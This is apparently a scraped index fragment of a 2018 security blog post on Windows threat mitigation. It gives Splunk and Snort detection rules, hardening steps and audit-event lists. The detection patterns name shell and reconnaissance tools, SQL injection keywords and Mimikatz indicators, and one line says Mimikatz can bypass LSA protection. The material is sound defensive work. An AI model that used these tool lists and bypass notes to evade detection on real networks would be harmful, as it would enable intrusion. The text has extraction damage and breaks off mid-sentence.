Escalation \u00b6 index = sysmon sourcetype = \"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode = 4688 Token_Elevation_Type = \"*(2)\" Potential Beaconing Detection \u00b6 index = proxy sourcetype = bluecoat : proxysg : access : syslog url =* | eval current_time = _time | sort 0 + current_time | streamstats global = f window = 2 current = f last ( current_time ) AS previous_time by src , url | eval diff_time = current_time - previous_time | eventstats count , stdev ( diff_time ) AS std by src , url Detect webshell activity (note this should be updated at implementation and often) \u00b6 index = sysmon ParentImage = \"*\u0007pache*\" ParentImage = \"* omcat*\" ParentImage = \"* ginx*\" ParentImage = \"*\\httpd*\" ParentImage = \"*\\php-cgi*\" ParentImage = \"*\\w3wp*\" CommandLine = \"*whoami*\" CommandLine = \"*net*\" CommandLine = \"*ipconfig*\" CommandLine = \"*hostname*\" CommandLine = \"*systeminfo*\" CommandLine = \"*cmd*\" CommandLine = \"*sh*\" CommandLine = \"*bash*\" CommandLine = \"*powershell*\" Detect potential SQLi \u00b6 index = weblogs sourcetype = MSWindows : 2008 R2 : IIS | regex cs_uri_query= \"(?i)(?:--|;|/*|@|@@version|char|alter|begin|cast|create|cursor|declare|delete|drop|end|exec|fetch|insert|kill|open|select|sys|table|update)\" | stats count by host c_ip cs_uri_stem cs_uri_query | rex field = cs_uri_query \"(?i)(?<suspect>--|;|/*|@|@@version|char|alter|begin|cast|create|cursor|declare|delete|drop|end|exec|fetch|insert|kill|open|select|sys|table|update)\" max_match = 0 View HTTP POST with response \u00b6 index = json_bro eventtype = bro_http method = POST AND status <= 403 AND uri =* . php OR uri =* . jsp OR uri =* . cfm OR uri =* . asp OR uri =* . aspx | stats values ( id . orig_h ) AS Source , values ,( hostname ) AS Destination by uri Find Weird User-Agents \u00b6 index = json_bro eventtype - bro_http | stats count by user_agent | sort - count | reverse Get high severity EPO events \u00b6 index = av sourcetype = mcafee : epo ( severity = critical OR severity = high ) | stats values ( event_description ) AS desc , values ( signature ) AS signature , values ( file_name ) AS file_path , count AS result BY dest | eval dd = \"index=av sourcetype=mcafee:epo (severity=critical OR severity=high) dest=\" . dest Snort \u00b6 Note these are examples and are mainly illustrated as templates for creating your own internal searches Detect psexec \u00b6 alert tcp any any - > $ HOME_NET [ 139 , 445 ] ( msg : \"ET POLICY PsExec? service created\" ; flow : to_server , established ; content : \"5c 00 50 00 53 00 45 00 58 00 45 00 53 00 56 00 43 00 2e 00 45 00 58 00 45\" ; reference : url , xinn . org / Snort-psexec . html ; reference : url , doc . emerginthreats . net / 2010781 : classtype : suspicious-filename-detect : sid : 201781 ; rev : 2 ;) Detect packets with with port 4444 (port 0?) \u00b6 alert tcp $ EXTERNAL_NET any <> $ HOME_NET 4444 ( msg : \"BAD-TRAFFIC tcp port 4444 traffic\" ; flow : stateless ; classtype : misc-activity ; sid : 524 ; rev : 8 ;) \" Snort appid list \u00b6 sudo u2openappid / var / log / snort / appstats - unified . log . 1455060958 | egrep - v '\"http\"|\"https\"|\"dns\"|\"internet_explor\"' | cut - d \",\" - f2 | sort | uniq - c | sort - nr Interesting file extensions (Note this is the same list as above, placed here for use in monitoring via Snort) \u00b6 .ade , .adp , .ani , .bas , .bat , .chm , .cmd , .com , .cpl , .crt , .exe , .hlp , .ht , .hta , .inf , .ins , .isp , .jar , .job , .js , .jse , .lnk , .mda , .mdb , .mde , .mdz , .msc , .msi , .msp , .mst , .ocx , .pcd , .ps1 , .reg , .scr , .sct , .shs , .svg , .url , .vb , .vbe , .vbs , .wbk , .wsc , .ws , .wsf , .wsh , .exe , .pif , .pub , .ip Additional Useful Info \u00b6 Get methods from access.log \u00b6 cat access . log | cut - d \" - f2 | cut - d ' ' - f1 | sort - u Decode %encoded url (line 290) \u00b6 awk ' {if (length($0) > max){max=length($0);maxline=$0}} END {print maxline } ' access . log | cut - d \" \" - f7 | sed s /%// g | sed s /+// g | sed s / ? // g | xxd - r - p or cat access . log | grep POST | grep cgi - bin | cut - d '\"' - f2 | sort - u | sed s /%// g | sed s /+// g | cut - d \"?\" - f2 | awk - F \"HTTP/1.1\" '{print $1}' | xxd - r - p Gather Information on Windows host \u00b6 List task services \u00b6 tasklist / svc / fi \"imagename eq file.exe\" Show modules for task \u00b6 tasklist / m / fi \"imagename eq file.exe\" Verbose task information \u00b6 tasklist / v / fi \"imagename eq file.exe\" Get information about processes \u00b6 get - wmiobject - class Win32_Process - Filter 'Name=\"file.exe\"' and get-process | select * |Where-Object { $_.ID - eq PID } and gwmi Win32_Process|Select ProcessName,ProcessID,ParentProcessID,CommandLine,@ { e = { $_.GetOwner (). User }} |ft -wrap;netstat ano Look for code injected into memory \u00b6 Get - InjectedThread . ps1 Reference \u2013 https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2","title":"Threat Mitagation Strategies - Part 2"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#threat-mitigation-strategies-part-2","text":"James Tubberville | May 15, 2018 | Tweet This Post: The following information was composed by Andrew Chiles (@andrewchiles), Joe Vest (@joevest) and myself (@minis_io) for quick and easy reference. Much of it was pulled together from a variety of sources with attempts to provide references for each. This post is intended to be more of a brain dump rather than a complete technical breakout. As discussed in the Threat Mitigation Strategies Part 1 http://threatexpress.com/2018/01/threat-mitigation-strategies-observations-recommendations/ , there is commonality between the inherent weaknesses and the actions a threat might perform within an information system or network. The following recommendations and informational snippets were derived from many offensive and defensive efforts that continue to support these correlations. Each recommendation and snippet can and very likely should be applied to all networks. Some systems and networks will have exceptions; however, these are exceptions (not the status quo) and should be handled as such. Also note the exact syntax and use will vary with the network construct, operating system/version, and legal/regulatory security requirements.","title":"Threat Mitigation Strategies: Part 2"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#account-management","text":"Accounts should have specific roles. General Guidelines Domain Administrators perform management of Windows Active Directory. They do not manage servers or workstations. Server Administrators perform management of servers. They do not manage workstations. Workstation Administrators perform management of workstation. They do not manage servers. Privileged accounts should NOT have external communications (Internet, email, etc.) Standard users should NOT have elevated access (use secondary accounts if required)","title":"Account Management"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#adjust-password-policy","text":"Adjust password policy to conform to \"800-63-3: Digital Identity Guidelines\". Remove periodic password change requirements Passwords should only be changed if forgotten or suspected compromise Warning I don't agree with the two above and recommend maintaining a reasonable duration for password change requirements Remove complexity requirements (Upper/Lower/Number/Special character) Require a minimum password length of A minimum length of 8 is required by NIST, but minimum of 16 is recommended for user accounts A minimum length of 20 (28+ is recommended) for service accounts Suggest the use of pass-phrases (such as four random lowercase words). Example: \"correct horse battery staple!\" Screen passwords against password compromise lists Screen passwords against keyboard walks Note Meeting the complexity recommendation may not be possible due to current compliance requirements.","title":"Adjust Password Policy"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#setting-the-password-policy-using-gpo","text":"Edit the \"Domain Password Policy\" GPO to configure the appropriate password length 1 2 3 1 . Open Group Policy 2 . Computer Configurations > Policies > Windows Settings > Security Settings > Account Policy > Password Policy 3 . Minimum password length : 20","title":"Setting the Password Policy using GPO"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#krbtgt-password-reset","text":"Regularly reset the KRBTGT password to minimize stolen credentials from be used in the future. 1 2 3 4 Review the reset tool guide \" Guide to Running New-CtmADKrbtgtKeys \" ( see references ) Use the the PowerShell script New - CtmADKrbtgtKeys . ps1 to reset the KRBTGT Wait 24 hours and execute the change a 2 nd time Recommend running on a regular schedule . This should be monthly , quarterly ( at most ) , or after an incident where compromise is suspected . References https://gallery.technet.microsoft.com/Reset-the-krbtgt-account-581a9e51 https://adsecurity.org/?p=483","title":"KRBTGT password reset"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#use-laps-to-manage-the-local-administrator-rid-500-password","text":"Install KB2871997 Follow details outlined at https://adsecurity.org/?p=1790 References https://adsecurity.org/?p=1790 https://adsecurity.org/?p=559","title":"Use LAPS to manage the local Administrator (RID 500) password"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#implement-managed-service-accounts","text":"Windows Server 2008 R2 and Windows 7 introduced Managed Service Accounts. MSA's allow you to create an account in Active Directory that is tied to a specific computer. That account has its own complex password (see password policy) and is maintained automatically. This means that an MSA can run services on a computer in a secure and easy to maintain manner, while maintaining the capability to connect to network resources as a specific user principal. Group level MSA's can be deployed in Windows 2012 or higher Domains. Reference https://blogs.technet.microsoft.com/askds/2009/09/10/managed-service-accounts-understanding-implementing-best-practices-and-troubleshooting/ https://technet.microsoft.com/en-us/library/hh831782.aspx","title":"Implement Managed Service Accounts"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#protected-lsa","text":"","title":"Protected LSA"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#protect-lsa-via-policy","text":"1 2 1 . Advanced Audit Policy Configuration > Object Access > Audit Kernel Object 2 . Enable SACL L \"S:(AU;SAFA;0x0010;;;WD)\" and 1 2 3 4 1 . Computer Configuration > Preferences > Windows Settings 2 . Right - click Registry > New > Registry Item 3 . Hive HKLM > Path SYSTEMCurrentControlSetControlLsa 4 . DWORD value RunAsPPL = 00000001 Note LSA Protection prevents non-protected processes from interacting with LSASS. Mimikatz can still bypass this with a driver (\"!+\").","title":"Protect LSA Via policy"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#protect-lsa-via-registry-entry","text":"Manually create registry entry HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa DWORD RunAsPPL = 00000001 or reg add HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa / v RunAsPPL / d 00000001 / t REG_DWORD Windows Event Forwarding (WEF) reads any operational or administrative event log on a device in your organization and forwards the events you choose to a Windows Event Collector (WEC) server.","title":"Protect LSA Via Registry Entry"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#windows-logs","text":"The Windows Logs category includes the logs that were available on previous versions of Windows: the Application, Security, and System logs. It also includes two new logs: the Setup log and the ForwardedEvents log. Windows logs are intended to store events from legacy applications and events that apply to the entire system.","title":"Windows Logs"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#application-log","text":"The Application log contains events logged by applications or programs. For example, a database program might record a file error in the application log. Program developers decide which events to log.","title":"Application log"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#security-log","text":"The Security log contains events such as valid and invalid logon attempts, as well as events related to resource use, such as creating, opening, or deleting files or other objects. Administrators can specify what events are recorded in the security log. For example, if you have enabled logon auditing, attempts to log on to the system are recorded in the security log.","title":"Security log"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#setup-log","text":"The Setup log contains events related to application setup.","title":"Setup log"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#system-log","text":"The System log contains events logged by Windows system components. For example, the failure of a driver or other system component to load during startup is recorded in the system log. The event types logged by system components are predetermined by Windows.","title":"System log"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#forwardedevents-log","text":"The ForwardedEvents log is used to store events collected from remote computers. To collect events from remote computers, you must create an event subscription. To learn about event subscriptions, see Event Subscriptions.","title":"ForwardedEvents log"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#applications-and-services-logs","text":"Applications and Services logs are a new category of event logs. These logs store events from a single application or component rather than events that might have system wide impact. This category of logs includes four subtypes: Admin, Operational, Analytic, and Debug logs. Events in Admin logs are of particular interest to IT Professionals using the Event Viewer to troubleshoot problems. Events in the Admin log should provide you with guidance about how to respond to them. Events in the Operational log are also useful for IT Professionals, but they are likely to require more interpretation. Admin and Debug logs are not as user friendly. Analytic logs store events that trace an issue and, often, a high volume of events are logged. Debug logs are used by developers when debugging applications. Both Analytic and Debug logs are hidden and disabled by default. To make these logs visible, follow the steps in Show or Hide Analytic and Debug Logs. To enable these logs, follow the steps in Enable Analytic and Debug Logs.","title":"Applications and Services Logs"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#admin","text":"These events are primarily targeted at end users, administrators, and support personnel. The events that are found in the Admin channels indicate a problem and a well-defined solution that an administrator can act on. An example of an admin event is an event that occurs when an application fails to connect to a printer. These events are either well documented or have a message associated with them that gives the reader direct instructions of what must be done to rectify the problem.","title":"Admin"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#operational","text":"Operational events are used for analyzing and diagnosing a problem or occurrence. They can be used to trigger tools or tasks based on the problem or occurrence. An example of an operational event is an event that occurs when a printer is added or removed from a system.","title":"Operational"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#analytic","text":"Analytic events are published in high volume. They describe program operation and indicate problems that cannot be handled by user intervention.","title":"Analytic"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#debug","text":"Debug events are used by developers troubleshooting issues with their programs.","title":"Debug"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#advanced-audit-policy-should-focus-on-these-in-no-specific-order","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 1 . A logon was attempted using explicit credentials : Event 552 and 4648 2 . A member was added to a security - enabled global group : Event 4728 3 . A member was added to a security - enabled local group : Event 4732 4 . A member was added to a security - enabled universal group : Event 4756 5 . An account failed to log on : Event 529 - 539 4625 ( followed by a success 4624 ) 6 . LogonAccount / TargetUserName is Administrator ( Using RID - 500 ): Event 4624 , 4776 7 . Scheduled Task Creation : Event 602 , 4698 8 . Log was cleared : Event 104 and 1102 , 4949 9 . EMET dies : Event 1 and 2 10 . Application Error or Hang : Event 1000 and 1002 11 . Windows Defender Errors : Event 1005 , 1006 , 1008 , 1010 , 2001 , 2003 , 2004 , 3002 , 5008 12 . New process : User NOT admin and Event 4688 ( arp , at , bcdedit , certutil , cscript , cmd , dsquery , hostname , ipconfig , msbuild , nbtstat , net , netsh , netstat , nslookup , ntdsutil , pcalua , ping , powershell , psexec , reg , regasm , regedit , regedt32 , regsvr32 , regsvcs , rundll32 , set , sc , schtasks , systeminfo , tasklist , tracert , whoami , wmic , wscript , wsmprovhost ) 13 . Service creation / install : Event 601 , 4697 , 7045 14 . Service changes : Event 7040 15 . File share access / attempts ( C $ , ADMIN $ , IPC$ ): Event 5140 16 . PowerShell execution and module loading : Event 501 and 4104 respectively 17 . External media detection : All Events 7045 , 10000 , 10001 or 10002 , 10100 , 20001 , 20003 , 24576 , 24577 , 24579 18 . User creation : Event 4720 Tip It's a good idea to hide/exclude these events except specific conditions (See caveats above) as these are consistently rolling: 4688,4689,5156,5158","title":"Advanced Audit Policy should focus on these (in no specific order)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-command-line-logging-must-include-ms15-015-kb3031432","text":"HKLMSoftwareMicrosoftWindowsCurrentVersionPoliciesSystemAudit DWORD ProcessCreationIncludeCmdLine_Enabled = 1","title":"Enable Command Line Logging (Must include MS15-015 KB3031432)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#account-honeytoken-manual","text":"echo \"crazypassword\" | runas / u : yourdomain . comXadmin / netonly ipconfig Consider a check on 4625 where Xadmin is found Also add hash of crazypassword to IDS and alert when seen","title":"Account HoneyToken (manual)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#account-honeytoken-network","text":"Invoke - HoneyCreds . ps1 Reference: https://github.com/Ben0xA/PowerShellDefense/blob/master/Invoke-HoneyCreds.ps1","title":"Account HoneyToken (network)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#spn-honeytoken","text":"Set - ADUser watchaccount - ServicePrincipalNames @ { Add = \" MSSQLSvc / sql1 : 1433 \u2033}","title":"SPN HoneyToken"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#powershell-module-logging","text":"Ensure all Windows systems have PowerShell v3 or newer. Newer versions of PowerShell have better logging features, especially PowerShell v5. This will log all PowerShell activity including all PowerShell modules. Enable PowerShell Module Logging 1 2 3 4 1 . Open Group Policy 2 . Computer Configuration > Policies > Administrative Templates > Windows Components > Windows PowerShell 3 . Turn on Module Logging 4 . Enter \"*\" and click OK . `","title":"PowerShell Module Logging"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#log-parsing","text":"If enabled, PowerShell activity will be logged to the Microsoft-Windows-PowerShell/Operational Log. Push or pull these events to a central logging server (via Windows Event Forwarding or similar) or SIEM.","title":"Log Parsing"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#parse-powershell-events-for-the-following-mimikatz-indicators","text":"1 2 3 4 5 \"System.Reflection.AssemblyName\" \"System.Reflection.Emit.AssemblyBuilderAccess \" \"System.Runtime.InteropServices.MarshalAsAttribute\" \"TOKEN_PRIVILEGES\" \"SE_PRIVILEGE_ENABLED\" `","title":"Parse PowerShell events for the following Mimikatz indicators"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detecting-offensive-powershell-tools","text":"Many PowerShell offensive tools use the following calls which are logged in PowerShell Module Logging. 1 2 3 4 5 6 7 8 9 \"GetDelegateForFunctionPointer\" \"System.Reflection.AssemblyName\" \"System.Reflection.Emit.AssemblyBuilderAccess\" \"System.Management.Automation.WindowsErrorReporting\" \"MiniDumpWriteDump\" \"TOKEN_IMPERSONATE\" \"TOKEN_DUPLICATE\" \"TOKEN_ADJUST_PRIVILEGES\" \"TOKEN_PRIVILEGES\" ` Reference https://github.com/palantir/windows-event-forwarding/tree/master/group-policy-objects https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Subscriptions/samples https://docs.microsoft.com/en-us/windows/threat-protection/use-windows-event-forwarding-to-assist-in-instrusion-detection https://github.com/MicrosoftDocs/windows-itpro-docs/blob/master/windows/threat-protection/use-windows-event-forwarding-to-assist-in-instrusion-detection.md","title":"Detecting Offensive PowerShell Tools"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-windows-legacy-typically-unused-features","text":"The reference (Securing Windows Workstations: Developing a Secure Baseline) located at https://adsecurity.org/?p=3299 contains a wealth of information to help reduce security risks in a Windows Domain. Key mitigations are highlighted below.","title":"Disable Windows Legacy &amp; Typically Unused Features"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#force-group-policy-to-reapply-settings-during-refresh","text":"Computer Configuration > Policies > Administrative Templates > System > Group Policy > Configure security policy processing Set to Enabled Also check the box for \" Process even if the Group Policy objects have not changed \" It's also recommended to configure the same settings for each of the following: Computer Configuration, Policies, Administrative Templates, System, Group Policy, Configure registry policy processing Computer Configuration, Policies, Administrative Templates, System, Group Policy, Configure scripts policy processing As well as any other policy settings as needed.","title":"Force Group Policy to reapply settings during \"refresh\""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-unneeded-services","text":"The document Service-management-WS2016.xlsx contains a list default services, their state, use, and if it is safe to disable. Review the Services outlined in the document Service-management-WS2016.xlsx Create a list of service to disable, and enforce via GPO","title":"Disable Unneeded Services"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-net-session-enumeration-netcease","text":"This hardening process prevents attackers from easily getting some valuable recon information to move laterally within their victim's network. Run the NetCease PowerShell script on Server Include DCs, Fileservers, or other servers where Session information may be used by and attacker for enumeration References https://gallery.technet.microsoft.com/Net-Cease-Blocking-Net-1e8dcb5b https://adsecurity.org/?p=3299","title":"Disable Net Session Enumeration (NetCease)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-wpad","text":"Web Proxy Auto-Discovery Protocol (WPAD) is \"a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. Once detection and download of the configuration file is complete, it can be executed to determine the proxy for a specified URL.\" Disable WPAD via Group Policy by deploying the following registry change: HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet SettingsWpad New DWORD ( 32 - Bit Value ) called \"WpadOverride\" and set to \"1\" Disable the service \"WinHTTP Web Proxy Auto-Discovery Service\" Computer Configuration > Policies > Windows Settings > Security Settings > System Services Set WinHTTP Web Proxy Auto - Discovery Service to Disabled Note: Partial mitigation of WPAD issues is possible by installing the Microsoft patch KB3165191 (MS16-077). This patch hardens the WPAD process and when the system responds to NetBIOS requests.","title":"Disable WPAD"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-llmnr","text":"Link-Local Multicast Name Resolution (LLMNR): In a nutshell, Link-Local Multicast Name Resolution (LLMNR) resolves single label names (like: COMPUTER1), on the local subnet, when DNS is unable to resolve the name. Disable LLMNR via Group Policy by deploying the following: Group Policy : Computer Configuration / Administrative Templates / Network / DNS Client Set \"Turn Off Multicast Name Resolution\" to \"Enabled\"","title":"Disable LLMNR"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#disable-wdigest","text":"WDigest provides support for Digest authentication which is: \"An industry standard that is used in Windows Server 2003 for Lightweight Directory Access Protocol (LDAP) and Web authentication. Digest Authentication transmits credentials across the network as an MD5 hash or message digest.\" Prior to Windows 8.1 and Windows Server 2012 R2, Wdigest was enabled which placed the user's \"clear text\" password in LSASS memory space in order to support basic authentication scenarios. Windows 8.1 and Windows Server 2012 R2 and newer have WDigest disabled by default. Disable WDigest via Group Policy by deploying the following registry change: HKEY_LOCAL_MACHINESystemCurrentControlSetControlSecurityProvidersWdigestUseLogonCredential = \"0\" References https://adsecurity.org/?p=3299","title":"Disable WDigest"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#remove-the-use-of-ntlm-v1","text":"Windows Server 2008 R2 included features to help identify NTLM authentication use on the network. It is important to completely remove these legacy authentication protocols since they are insecure. Removal and prevention of LM and NTLMv1 use can be activated through the use of Group Policy security settings. Plan to move to NTLMv2 and Kerberos at the least, with the long-term goal being Kerberos only. Audit the use of NTLM v1 on the network Determine the risks and need to support NTLM v1 Disable the use of NTLM v1 Reference https://technet.microsoft.com/en-us/library/jj865674(v=ws.10).aspx https://technet.microsoft.com/en-us/library/dd560653%28v=ws.10%29.aspx","title":"Remove the use of NTLM v1"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#consider-other-mitigations","text":"Consider other mitigations detailed at https://adsecurity.org/?p=3299 References https://adsecurity.org/?p=3299","title":"Consider other Mitigations"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#deploy-security-back-port-patch-kb2871997","text":"Ensure all Windows systems prior to Windows 8.1 & Windows Server 2012 R2 have the KB2871997 patch installed. This patch updates earlier supported versions of Windows with security enhancements baked into Windows 8.1 & Windows Server 2012 R2. References https://adsecurity.org/?p=559 https://blogs.technet.microsoft.com/kfalde/2014/11/01/kb2871997-and-wdigest-part-1/","title":"Deploy security back-port patch (KB2871997)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#prevent-local-administrator-accounts-from-authenticating-over-the-network","text":"While the local Administrator (RID 500) account on two different computers has a different SID, if they have the same account name and password, the local Administrator account from one can authenticate as Administrator on the other. The same is true with any local account that is duplicated on multiple computers. This presents a security issue if multiple (or all) workstations in an organization have the same account name and password since compromise of one workstation results in compromise of all. Windows 8.1 & Windows 2012 R2 and newer introduced two new local SIDs: S-1-5-113: NT AUTHORITYLocal account S-1-5-114: NT AUTHORITYLocal account and member of Administrators group These SIDs are also added in earlier supported versions of Windows by installing the KB2871997 patch. Install patch KB2871997","title":"Prevent local \"administrator\" accounts from authenticating over the network"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#configure-through-group-policy","text":"1 2 3 4 1 . Open Group Policy Management ( gpmc . msc or via MMC Group Policy Object Editor ) 2 . Computer Configuration > Windows Settings > Local Policies > User Rights Assignment 3 . Deny access to this computer from the network : Local account and member of Administrators group 4 . Deny log on through Remote Desktop Services : Local account and member of Administrators group","title":"Configure through Group Policy:"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#remote-connections","text":"","title":"Remote Connections"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#rdp-restricted-admin-connect-to-only-1-resource","text":"mstsc / v : server / restrictedAdmin","title":"RDP Restricted Admin (Connect to only 1 resource)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-restricted-admin-via-registry","text":"Manually create registry entry HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa DWORD DisableRestrictedAdmin = 0 or reg add HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa / v DisableRestrictedAdmin / d 0 / t REG_DWORD","title":"Enable Restricted Admin via Registry"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-restricted-admin-via-gpo","text":"1 2 3 1 . Open Group Policy Management ( gpmc . msc or via MMC Group Policy Object Editor ) 2 . Computer Configurations > Policies > Administrative Templates > System > Credential Delegation 3 . Set \"Restrict Delegation of credential to remote servers\" to enable","title":"Enable Restricted Admin via GPO"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#rdp-windows-defender-remote-credential-guard-connect-to-multiple-resources","text":"mstsc / v : server / remoteguard","title":"RDP Windows Defender Remote Credential Guard (Connect to multiple resources)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-windows-defender-credential-guard-via-registry","text":"Manually create registry entry HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa DWORD DisableRestrictedAdmin = 0 or reg add HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa / v DisableRestrictedAdmin / d 0 / t REG_DWORD","title":"Enable Windows Defender Credential Guard via Registry"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-windef-cred-guard-via-gpo","text":"1 2 3 4 1 . Open Group Policy Management ( gpmc . msc or via MMC Group Policy Object Editor ) 2 . Computer Configurations > Policies > Administrative Templates > System > Credential Delegation 3 . Set \"Restrict Delegation of credential to remote servers\" to enable 4 . In Options , Under use the following restricted mode : Choose \"Prefer Windows Defender Remote Credential Guard\" Note If all systems are Windows 10/2016, Choose \"Require Remote Credential Guard\"","title":"Enable WinDef Cred Guard via GPO"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#limit-client-to-client-communication-implement-and-configure-host-based-firewalls","text":"Clients and Server should be split into separate OU's Enable the Windows Firewall through GPO (Optional) Add exceptions to systems that are used to manage other hosts such as Sysadmins. Use a jump host to minimize exposure.","title":"Limit Client-to-Client Communication (Implement and Configure Host Based Firewalls)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#enable-firewall","text":"PowerShell 1) Create a GPO to hold the Workstation FW settings (workstation_fw) Example 1 2 Set - NetFirewallProfile - Profile Domain , Public , Private - Enabled True \u2013 PolicyStore example_domain . localworkstation_fw Set - NetFirewallProfile - DefaultInboundAction Block - DefaultOutboundAction Allow \u2013 NotifyOnListen True - AllowUnicastResponseToMulticast True \u2013 LogFileName % SystemRoot % System32LogFilesFirewallpfirewall . log \u2013 PolicyStore example_domain . localworkstation_fw 2) Assign the GPO to a Workstation Container References https://technet.microsoft.com/en-us/library/hh831755(v=ws.11).aspx","title":"Enable Firewall"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#blockcontrol-tcpudp-access-from-the-internal-network-and-dmz","text":"Evaluate the need for servers to connect to the Internet. Create a list of systems outside the network that require access. Limit access using this whitelist. Configure firewall rules to enforce these traffic policies.","title":"Block/control TCP/UDP access from the Internal network and DMZ"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#block-out-bound-tcpudp-access-from-the-client-systems-to-outbound-networks","text":"Clients generally only need a few ports to connect out bound. Limit access from client workstations to these ports. Create a list of ports required by clients to communicate outside the network. Limit access using this whitelist. Configure firewall rules to enforce these traffic policies. Rule can be managed at the HOST level via GPO or the network level via firewall rules.","title":"Block out bound TCP/UDP access from the Client systems to outbound networks."},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#implement-a-proxy-for-all-outbound-traffic","text":"Force systems to traverse an proxy to communicate outbound. It is preferred to only allow authenticated communications. This prevents privilege users (SYSTEM, root) from communicating outbound. At a minimum, force all client's HTTP(S) and DNS through a proxy If possible, require user authentication Prevent outbound access if a client or system attempts to connect to external port directly using network firewall rules","title":"Implement a Proxy for All Outbound Traffic"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#create-a-new-gpo-to-manage-the-proxy-settings","text":"Edit the GPO User Configuration > Windows Settings > Internet Explorer Maintenance > Connection 1 2 Select Proxy Server Enter the Proxy IP address and Port Prevent Users from Changing Settings 1 2 User Configuration > Administrative Templates > Windows Components > Internet Explorer > Internet Control Panel Set Disable the Connections Page to Enabled","title":"Create a new GPO to manage the proxy settings"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#configurations","text":"","title":"Configurations"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#autoruns","text":"1 2 3 4 5 1 . De - select \"Hide Microsoft Entries\" 2 . De - select \"Hide Windows Entries\" 3 . Under Scan Options , enable \"Verify code signatures\" 4 . Under Scan Options , enable \"Check VirusTotal.com\" ( note this shouldn ' t be done on GOV or otherwise sensitive 